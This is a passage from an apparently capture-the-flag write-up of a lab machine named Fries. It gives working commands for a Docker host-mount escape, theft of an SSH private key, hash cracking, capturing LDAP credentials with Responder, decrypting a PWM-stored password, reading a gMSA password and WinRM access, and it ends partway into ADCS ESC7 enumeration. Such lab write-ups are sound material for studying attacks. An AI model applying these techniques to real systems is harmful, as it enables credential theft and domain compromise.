REPOSITORY       TAG       IMAGE ID       CREATED         SIZE
<none>           <none>    a35a9aa8056b   8 months ago    513MB
fries-web        latest    192168217481   13 months ago   151MB
postgres         16        616e340baeac   14 months ago   436MB
dpage/pgadmin4   9.1.0     b2e76a3c5433   16 months ago   513MB
pwm/pwm-webapp   latest    6b2bacb1343e   17 months ago   378MB
gitea/gitea      1.22.6    dfd595e2afd4   19 months ago   167MB
```

`fries-web` is small and easy to run. I’ll start a copy of it with the root of the host filesystem mounted as `/0xdf` in the container, and run a `bash` shell:

```console
svc@web:~$ docker run -it --rm -v /:/0xdf fries-web bash
root@359d53b4e78b:/app#
```

`/0xdf` is the root of the host filesystem:

```console
root@359d53b4e78b:/# cat etc/hostname
359d53b4e78b
root@359d53b4e78b:/# cat 0xdf/etc/hostname
web
root@359d53b4e78b:/# ls 0xdf/
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swap.img  tmp  var
```

#### SSH

In `/0xdf/root` there’s a `.ssh` directory:

```console
root@359d53b4e78b:/0xdf/root/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
```

The `authorized_keys` file has two keys:

```plaintext
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCIqxXWF2sSX59PRqSzKr7dFTsQ5eUJkszTLfsWAlDGQ5nBpLn6nm97KoH/e5T+p/hM4stX6lG+Ipov0kO7gcspJHboIgfPfH6eIJUzZhFKRULMPJesbNkIoD+juCiB3N4bjvRe3tHB7dAwZuOElAUMrrIE7qZXvIXLtbwBDhV4/4Sy1lSVrOihihknYu6PwHQOlvhyHBUyDkMQkDW7CTEgLt2PAHswJGbSlnGRlyXYV5TZEL6opDKN1rclCbOdQASxnyE+EFQHpNu+9efncZm5jFELDNxV+WRwmKd0QjCjKiDD++YTCbmxVaLHUPcSvuwa0Xb6c2ZHUvhanVMq7pVzqD1g3DDrsbfnEpbtHsYcQnkMoc5XfxeDcXa0AuHPGPFXZv21Wc93vvmPAdFDMGK1V2T70inSv4PygKQZ/tAUeAqfx83IfTLTanpaGsjhGFzfaOBJRBX7AtQeZEvoqxFEeQcL29aBg1McUk1/GiNQti2vC5KEFBh1+5PRsMHufPU= root@web
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF/6QCKXFBRsJ7kDKTjtMOIrCKYQJ1MUKBf5qfFyyLb5 fries\administrator@DC01
```

The first is from root@web, which is the key pair in the same directory. The other is from the administrator on DC01.

I’ll grab the private key and SSH in as root:

```console
oxdf@hacky$ vim ~/keys/fries-web-root
oxdf@hacky$ chmod 600 ~/keys/fries-web-root
oxdf@hacky$ ssh -i ~/keys/fries-web-root root@fries.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)
...[snip]...
root@web:~#
```

And here’s `user.txt`:

```console
root@web:~# cat user.txt
7dec3391************************
```

## Auth as svc_infra

### Enumeration

#### root Directory

I’ll take a look at `/root` on web:

```console
root@web:~# ls -la
total 52
drwx------  9 root root 4096 Nov 19  2025 .
drwxr-xr-x 19 root root 4096 May 30  2025 ..
lrwxrwxrwx  1 root root    9 Nov 12  2025 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 May 27  2025 .cache
drwxr-xr-x  3 root root 4096 Aug 20  2023 .config
drwxr-xr-x  2 root root 4096 Jun  5 16:14 .docker
-rw-------  1 root root   35 Nov 19  2025 .lesshst
drwxr-xr-x  3 root root 4096 Aug 20  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwxr-xr-x  5 root root 4096 Nov 12  2025 scripts
drwx------  3 root root 4096 Aug 20  2023 snap
drwx------  2 root root 4096 Nov 18  2025 .ssh
-rw-r--r--  1 root root   34 Jul 19 03:13 user.txt
```

`.docker` has the same setup I generated above to get access to the Docker API:

```console
root@web:~# ls .docker/
ca.pem  cert.pem  key.pem
```

`scripts` has several scripts:

```console
root@web:~/scripts# ls
clear-containers.sh  docker-compose.yml  pwm               start-web-svc.sh  web
clear-share.sh       gitea               restore-certs.sh  stop-web-svc.sh
```

Three of these run every five minutes:

```console
root@web:~/scripts# crontab -l
...[snip]...
# m h  dom mon dow   command
*/5 * * * * /root/scripts/clear-containers.sh >/dev/null 2>&1
*/5 * * * * /root/scripts/clear-share.sh >/dev/null 2>&1
*/5 * * * * /root/scripts/restore-certs.sh >/dev/null 2&1
```

`clear-containers.sh` uses the `.docker` directory (just like I did above) to auth to the Docker API, getting a list of all the running containers and kills any that aren’t in the five that are running at the start of the box:

```bash
#!/bin/bash

export DOCKER_TLS_VERIFY=1
export DOCKER_CERT_PATH="/root/.docker"
export DOCKER_HOST=tcp://127.0.0.1:2376

PRESERVE_NAMES="pwm pgadmin gitea flask postgres"

NOW=$(date +%s)

docker ps -a --format "{{.ID}} {{.Names}}" | while read ID NAME; do
    # Skip if the name matches any in the preserve list
    for PRESERVED in $PRESERVE_NAMES; do
        if [[ "$NAME" == *"$PRESERVED"* ]]; then
            continue 2
        fi
    done

    CREATED=$(docker inspect -f '{{.Created}}' "$ID")

    CREATED_EPOCH=$(date --date="$CREATED" +%s)

    AGE=$((NOW - CREATED_EPOCH))

    if [ "$AGE" -lt 300 ]; then
        docker rm -f "$ID"
    fi
done
```

`clear-share.sh` is clearing out the `share` folder (as I observed already):

```bash
#!/bin/bash

TARGET_DIR="/srv/web.fries.htb/shared"

# Delete all regular files
rm -f "$TARGET_DIR"/*

# Delete hidden files, but avoid '.' and '..'
find "$TARGET_DIR"/.??* -type f -exec rm -f {} +

# Optional: delete empty subdirectories (uncomment if needed)
# find "$TARGET_DIR" -type d -empty -delete
```

`restore-certs.sh` makes sure that the needed files are in the `certs` directory:

```bash
#!/bin/bash

SRC_DIR="/etc/docker/certs"
DEST_DIR="/srv/web.fries.htb/certs"
CERT_FILES=(
  "ca-key.pem"
  "ca.pem"
  "server-cert.pem"
  "server.csr"
  "server-key.pem"
  "server-openssl.cnf"
)

for FILE in "${CERT_FILES[@]}"; do
  cp -f "$SRC_DIR/$FILE" "$DEST_DIR/$FILE"
  chown root:"infra managers" "$DEST_DIR/$FILE"
  chmod 640 "$DEST_DIR/$FILE"
done
```

`web`, `gitea`, and `pwm` are files needed by their Docker containers:

```console
root@web:~/scripts# ls web/
app  Dockerfile  docs  README.md  requirements.txt  run.py
root@web:~/scripts# ls gitea/
git  gitea  ssh
root@web:~/scripts# ls pwm/
config  pwm-workpath
```

There isn’t a ton of interest in `web` or `gitea`.

I can also get shells in the running containers, but there isn’t much more than is here in the directories with all the files used to make the containers.

#### pwm

The `pwm` directory has two more directories:

```console
root@web:~/scripts/pwm# ls
config  pwm-workpath
```

`pwm-workpath` is empty. `config` has the configuration files used by the instance:

```console
root@web:~/scripts/pwm/config# ls
applicationPath.lock  backup  LocalDB  logs  PwmConfiguration.xml  temp
```

`PwmConfiguration.xml` is the main configuration file. It’s long, 2143 lines. Looking through it, there are a few password-like things that jump out. `ldap.proxy.password` looks like the configuration with how the service authenticates with the domain:

```xml
<setting key="ldap.proxy.password" modifyTime="2025-06-01T02:07:43Z" profile="default" syntax="PASSWORD" syntaxVersion="0">
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password</label>
    <value>ENC-PW:oF4OfldGCHrbhPuevlVNUl2wkgUFlqTwZtjoks/G2peQhAo1lKDFaQxK7bZB67s4ZWjp9XSJ+eB0lEG8bLpd45hP8XAfY8abvgQJm3ztQ0c=</value>
</setting>
<setting key="ldap.proxy.username" modifyTime="2025-06-01T02:07:43Z" profile="default" syntax="STRING" syntaxVersion="0">
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User</label>
    <value>CN=svc_infra,CN=Users,DC=fries,DC=htb</value>
</setting>
```

In this case, it’s a user named svc_infra, and the password is encrypted.

I’ll note the `pwm.securityKey` as potentially interesting:

```xml
<setting key="pwm.securityKey" modifyTime="2025-06-01T02:07:43Z" syntax="PASSWORD" syntaxVersion="0">
    <label>Settings ⇨ Security ⇨ Application Security ⇨ Security Key</label>
    <value>ENC-PW:7UUVOi0nYr3nlzC16WMbxnn7KGWhIBsc4x6b1Q3XdY2zEOWA9ZGAtIy5l5NrKZCGPo/CX9b5OG/SB7rC+hgAzogj3DlkbnkdDYaAGVJXgy+lec5LO1vQcjXzZNBeXA+suqONj+sujtwfdVUiblFG0pRCk3DKhp0GMEUefPrT3z7k2s+/zoN9Km3crFEWAuPHLeD6vmW2fgd2DCmdJZd/NSEhDJnkdOR3gEydzBGNUzwd7tf1Tfffn78wWSckoc9JBHPoWZBt6CjG/wlvGFWd9C0Y/Oyf5DCNB1jqf9H1esMsQkDVb5NOM7l7nLg0lVpfEiOQMLU2m6ugh1SaA3VuITTWNIVvD24b1zxhOokVNJQyE9s4KJJQZMiAlO355RHQIOqnuxxLd+zhl7wdnfIC5St+XjG0HWDmGa3dPYrZeDAwc5prebiZTxnyv3PHLrLEptp3E59SgsMrkA85gxh3PTN8UiqUZjk49LHcuZ7ZtoG6F+cXnV+saZ/uC618vG2gxr52jaBflknuVXYf5vbQeDc6GNnN2CuPFaRgrgk4Ov3wVrmqY8n5Zzp+rPu5ZxvAx9IHhEp1ZvFtnLOFqwmM/tbwGnTUOVCk0ySOYKJJV3t+sPM0kwjK0nU12TkswpIsGTOkPt0hyw5JKPOLTdIjs27dlceNSfKRQ6zN6Q2iQ+52VI6ky5dU8Q0iUuG6eUsANclgGIsym/mjLeQ9Xg3D13SgknnWelMCA2hNw/puoK/FnhdwqgkcxVenRU4SZLcajyv265jSvz5+AEXl8yjfPgp4MT7AEAqf7jSZA7A3PzTu0u1FwB4JRbhInJP1pXEmVzCLQ0l4OH1HLJW4BSOWi03wuaHNmns5eE0N8Z7xRBMnO6Pw/9kFe8clF8I/wfh/8l3Zyu7avO18/5NNnFYd7qLUOKjBD7w6hirXxH6efkT6wB4rHMgpeu3vTQ9vhvPIQiUFSlaDwYZ6D0Fe69fC2U46jW+e/oZc3Mtq4oTCcuHsW6BIVMjfb8+WNk3Ed9qjTAsrJFLo2BYJ5tBwavWsxTMuu8OpECgVu+NdbSvOcZ67J1rh2ZDn9ZDzEwPDe3sarTEEap3OvncX8sk9y0l9ltFjEdvM8mVp3EYP8p01ojDcj6m6uHIZVhgNXtOSSiR/O8z5d+8Dd+csZl3ueZjOPmqLfWjtgs3wsLtdpPgy6/LJl2NMgnhuj7H80Cd+flBbp90eZfweCTtRVvQzrYJERf3Uxp4C5ZxbINcqh0Ghu2OwgP3vcKcIrb27mRna/rdyrmJHGsHIuXX+f8c6afY3qMUHTO9pFesASqU2phUUdZm8NyKNrPlpf28fgyHKsj84pyimyxQ4EJ7oPlDHJAa9HRYOpYDr4E5GZ8Lru27XUKTXpeS8B2jrA1LjJSiyEdptkXrCd+VJpinC2W+9kv2UJSYIkGoBg2jKQ9kp2s4utfo=</value>
</setting>
```

Right at the top there’s a `config` section with a `configPasswordHash`:

```xml
<properties type="config">
    <property key="configIsEditable">true</property>
    <property key="configEpoch">0</property>
    <property key="configPasswordHash">$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG</property>
</properties>
```

### PWM Access

#### Crack Hash

I’ll save the hashed password to a file and pass it to `hashcat`. It’s a bcrypt hash, so I’ll try `-m 3200` (plain bcrypt) first:

```console
$ hashcat pwm.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 3200
hashcat (v7.1.2) starting
...[snip]...
$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG:rockon!
...[snip]...
Started: Sun Jul 19 14:36:09 2026
Stopped: Sun Jul 19 14:36:16 2026
```

It cracks in seven seconds on my host to “rockon!”.

#### Configuration Editor

During initial enumeration I found the Configuration Manager and Configuration Editor links for PWM. They both require a password, and “rockon!” works to access them. The Configuration Manager looks like:

![image-20260719144855758](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260719144855758.png)

Configuration Editor is more interesting:

![image-20260719145044613](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260719145044613.png)

### LDAP Auth Capture

Under LDAP –> LDAP Directories –> default –> Connection, I’ll see it’s set up to authenticate to DC01.fries.htb:

![image-20260719145229526](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260719145229526.png)

I’ll click “Add Value” and add my host with unencrypted LDAP:

![image-20260719145343468](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260719145343468.png)

It adds just fine:

![image-20260719145527202](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260719145527202.png)

I’ll start [Responder](https://github.com/lgandx/Responder), and click “Test LDAP Profile”, and there’s an auth attempt at Responder:

```console
oxdf@hacky$ sudo uv run Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
...[snip]...
[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.244.72
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
...[snip]...
```

### Alternative Path - Decrypt LDAP Password

From the PWM config file, there’s a shortcut to get svc_infra’s password without having to go into PWM and capture the authentication attempt:

```
flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[Shell as root\non web]-->B(<a href='#pwm'>Find values in\nPwmConfiguration.xml</a>);
    B-->C(<a href='#crack-hash'>Crack Configuration\nPassword</a>);
    C-->D(<a href='#configuration-editor'>Reconfigure LDAP</a>);
    D-->E(<a href='#ldap-auth-capture'>Capture Password Auth</a>);
    E-->F[<a href='#auth-as-svc_infra'>Auth as svc_infra</a>];
    B-->G(<a href='#alternative-path---decrypt-ldap-password'>Decrypt svc_infra\nPassword</a>);
    G-->F;

linkStyle default stroke-width:2px,stroke:#4B9CD3,fill:none;
linkStyle 0,2,3,4,5,6 stroke-width:2px,stroke:#FFFF99,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;
```

PWM encrypts things using AES with a key that is derived from the creation time, which is stored in the config on the first line:

```xml
<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2025-06-01T02:07:43Z" modifyTime="2025-06-01T19:53:04Z" pwmBuild="b7ed22b" pwmVersion="2.0.8" xmlVersion="5">
```

I’ll drop into Python with the cryptography libraries, import what I need, and set variables:

```console
oxdf@hacky$ uv run --with pycryptodome python
Python 3.13.7 (main, Sep 18 2025, 19:47:49) [Clang 20.1.4 ] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64, hashlib, json
>>> from Crypto.Cipher import AES
>>> CREATE_TIME = "2025-06-01T02:07:43Z"
>>> ENC = "oF4OfldGCHrbhPuevlVNUl2wkgUFlqTwZtjoks/G2peQhAo1lKDFaQxK7bZB67s4ZWjp9XSJ+eB0lEG8bLpd45hP8XAfY8abvgQJm3ztQ0\c="
```

The key is a SHA1 hash of the creation time string with a static string appended:

```console
>>> key = hashlib.sha1((CREATE_TIME + "StoredConfiguration").encode("iso-8859-1")).digest()[:16]
```

I’ll use that to decrypt:

```console
>>> pt  = AES.new(key, AES.MODE_ECB).decrypt(base64.b64decode(ENC))
>>> pt
b'{"salt":"v4DuLvUwLbqLOMq21Kgh1DD3LoMvvQqz","value":"m6tneOMAh5p0wQ0d"}\n\n\n\n\n\n\n\n\n\n'
>>> print("password:", json.loads(pt)["value"])
password: m6tneOMAh5p0wQ0d
```

Decrypting this allows me to skip the PWM access and capturing the LDAP auth.

### Validate Creds

The creds work for SMB and LDAP:

```console
oxdf@hacky$ netexec smb DC01.fries.htb -u svc_infra -p m6tneOMAh5p0wQ0d
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
oxdf@hacky$ netexec ldap DC01.fries.htb -u svc_infra -p m6tneOMAh5p0wQ0d
LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)
LDAP        10.129.244.72   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
```

But not WinRM:

```console
oxdf@hacky$ netexec winrm DC01.fries.htb -u svc_infra -p m6tneOMAh5p0wQ0d
WINRM       10.129.244.72   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
WINRM       10.129.244.72   5985   DC01             [-] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
```

## Shell as gMSA_CA_prod$

### BloodHound

Finally with a domain credential, I’ll collect BloodHound data with [RustHound-CE](https://github.com/g0h4n/RustHound-CE):

```console
oxdf@hacky$ rusthound-ce -d fries.htb -u svc_infra -p m6tneOMAh5p0wQ0d -z
---------------------------------------------------
Initializing RustHound-CE at 02:20:54 on 07/20/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-07-20T02:20:54Z INFO  rusthound_ce] Verbosity level: Info
[2026-07-20T02:20:54Z INFO  rusthound_ce] Collection method: All
[2026-07-20T02:20:54Z INFO  rusthound_ce::ldap] Connected to FRIES.HTB Active Directory!
[2026-07-20T02:20:54Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-07-20T02:20:54Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-20T02:20:55Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=fries,DC=htb
[2026-07-20T02:20:55Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-20T02:20:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=fries,DC=htb
[2026-07-20T02:20:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-20T02:20:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=fries,DC=htb
[2026-07-20T02:20:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-20T02:20:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=fries,DC=htb
[2026-07-20T02:20:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-20T02:20:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=fries,DC=htb
[2026-07-20T02:20:56Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 4%
[2026-07-20T02:20:56Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2026-07-20T02:20:56Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 19 users parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 62 groups parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 2 computers parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-07-20T02:20:56Z INFO  rusthound_ce::json::maker::common] .//20260720022056_fries-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 02:20:56 on 07/20/26! Happy Graphing!
```

I’ll start the BloodHound-CE GUI and upload the zip archive.

The only user in AD that I’m confident that I own is svc_infra, which I’ll mark that way. This user has interesting outbound control:

![image-20260719152707660](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260719152707660.png)

In addition to being a member of Domain Users, it has `ReadGMSAPassword` over GMSA_CA_PROD$. That user is in Remote Management Users:

![image-20260719152916960](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260719152916960.png)

### WinRM Shell

I’ll use `netexec` to recover the GMSA password:

```console
oxdf@hacky$ netexec ldap DC01.fries.htb -u svc_infra -p m6tneOMAh5p0wQ0d --gmsa
LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)
LDAP        10.129.244.72   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
LDAP        10.129.244.72   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.244.72   389    DC01             Account: gMSA_CA_prod$        NTLM: b0f2883453608fb7bffd1ac2e0e18188     PrincipalsAllowedToReadPassword: svc_infra
```

It works to authenticate as the service account over SMB:

```console
oxdf@hacky$ netexec smb DC01.fries.htb -u gMSA_CA_prod$ -H b0f2883453608fb7bffd1ac2e0e18188
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [+] fries.htb\gMSA_CA_prod$:b0f2883453608fb7bffd1ac2e0e18188
```

And WinRM:

```console
oxdf@hacky$ netexec winrm DC01.fries.htb -u gMSA_CA_prod$ -H b0f2883453608fb7bffd1ac2e0e18188
WINRM       10.129.244.72   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
WINRM       10.129.244.72   5985   DC01             [+] fries.htb\gMSA_CA_prod$:b0f2883453608fb7bffd1ac2e0e18188 (Pwn3d!)
```

I’ll get a shell with [evil-winrm-py](https://github.com/adityatelange/evil-winrm-py):

```console
oxdf@hacky$ evil-winrm-py -i DC01.fries.htb -u gMSA_CA_prod$ -H b0f2883453608fb7bffd1ac2e0e18188
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.fries.htb:5985' as 'gMSA_CA_prod$'
evil-winrm-py PS C:\Users\gMSA_CA_prod$\Documents>
```

## Shell as Administrator

### Enumeration

#### Filesystem

There’s nothing of interest in gMSA_CA_prod$’s home directory. There are many other users with home directories:

```console
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/17/2025   9:26 PM                Administrator
d-----        5/21/2025   9:16 AM                b.briggs
d-----        5/21/2025   9:16 AM                b.horne
d-----        5/21/2025   9:16 AM                d.cooper
d-----        5/21/2025   9:14 AM                d.lynch
d-----        5/19/2025   8:44 AM                gMSA_CA_prod$
d-----        5/21/2025   9:16 AM                h.jennings
d-----        5/21/2025   9:16 AM                h.truman
d-----        5/21/2025   9:16 AM                j.hurley
d-----        5/21/2025   9:16 AM                l.johnson
d-----        5/21/2025   9:16 AM                l.palmer
d-r---        5/18/2025   5:19 AM                Public
d-----        5/21/2025   9:16 AM                s.johnson
d-----        5/21/2025   9:16 AM                w.earl
```

The service account can’t access any of them.

The root of `C:` is also very empty:

```console
evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/13/2025   2:27 PM                inetpub
d-----        11/5/2022  12:03 PM                PerfLogs
d-r---        5/26/2025  12:06 PM                Program Files
d-----         6/7/2025   7:56 AM                Program Files (x86)
d-r---        5/21/2025   9:16 AM                Users
d-----       11/17/2025   9:49 PM                Windows
```

`inetpub` is empty.

#### User

The user does have an interesting group:

```console
evil-winrm-py PS C:\> whoami /groups

GROUP INFORMATION
-----------------
Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
FRIES\Domain Computers                      Group            S-1-5-21-858338346-3861030516-3975240472-515 Mandatory group, Enabled by default, Enabled group
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

`BUILTIN\Certificate Service DCOM Access` (SID `S-1-5-32-574`) is a group that only exists where the ADCS Certification Authority role is installed, and its members are allowed to connect to the CA over DCOM to enroll for certificates. This group means that ADCS is deployed in the domain, and this account can request certificates from it.

This machine account also shows in BloodHound that it has direct enrollment rights with the CA:

![image-20260719182314506](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260719182314506.png)

`GMSA_CA_PROD$` has an `Enroll` edge straight to the enterprise CA (`FRIES-DC01-CA`), and enrollment is also granted broadly through `Domain Computers` and even `Authenticated Users`. Enroll rights on the CA alone don’t escalate anything. To abuse ADCS I need a certificate template that I can enroll in and that’s misconfigured.

#### ADCS

`certipy` will inspect ADCS for vulnerable templates:

```console
oxdf@hacky$ certipy find -u gMSA_CA_prod$ -hashes b0f2883453608fb7bffd1ac2e0e18188 -target DC01.fries.htb -vulnerable -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.fries.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fries-DC01-CA
    DNS Name                            : DC01.fries.htb
    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb
    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9
    Certificate Validity Start          : 2025-11-18 05:39:18+00:00
    Certificate Validity End            : 3024-05-19 14:11:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : FRIES.HTB\Administrators
      Access Rights
        ManageCa                        : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        Enroll                          : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
        ManageCertificates              : FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
    [+] User Enrollable Principals      : FRIES.HTB\Domain Computers
                                          FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Authenticated Users
    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

It doesn’t find any vulnerable templates, but does identify that the user has “dangerous permissions” on the CA, which it labels as ESC7.

### ESC7 [Fail]

This looks a lot like the situation presented on [HTB Manager](https://0xdf.gitlab.io/2024/03/16/htb-manager.html#esc7), where I abused ESC7 to get Administrator access. `gMSA_CA_prod$` has the `ManageCA` right, which by itself doesn’t let me issue certificates, but it does let me grant myself the `Manage Certificates` right by adding myself as a CA officer:

```console
